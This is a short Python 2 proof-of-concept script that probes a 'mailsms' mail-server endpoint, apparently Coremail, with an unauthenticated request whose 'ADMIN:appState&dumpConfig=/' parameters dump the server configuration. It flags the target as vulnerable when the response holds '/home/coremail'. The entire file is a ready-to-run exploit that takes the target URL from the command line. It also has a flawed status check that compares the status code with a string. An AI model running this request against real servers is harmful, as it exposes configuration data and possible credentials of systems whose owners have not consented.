# -*- coding: utf-8 -*-
#Author: Lowlines9
#Info: mailsms config dump poc

import requests,sys

def mailsmsPoC(url):
    url = url.strip()
    url = url + "/mailsms/s?func=ADMIN:appState&dumpConfig=/"
    r = requests.get(url)
    if (r.status_code != '404') and ("/home/coremail" in r.text):
        print "mailsms is vulnerable: {0}".format(url)
    else:
        print "mailsms is safe!"

if __name__ == '__main__':
    try:
        mailsmsPoC(str(sys.argv[1]))
    except:
        print "usage: python poc.py http://example.com"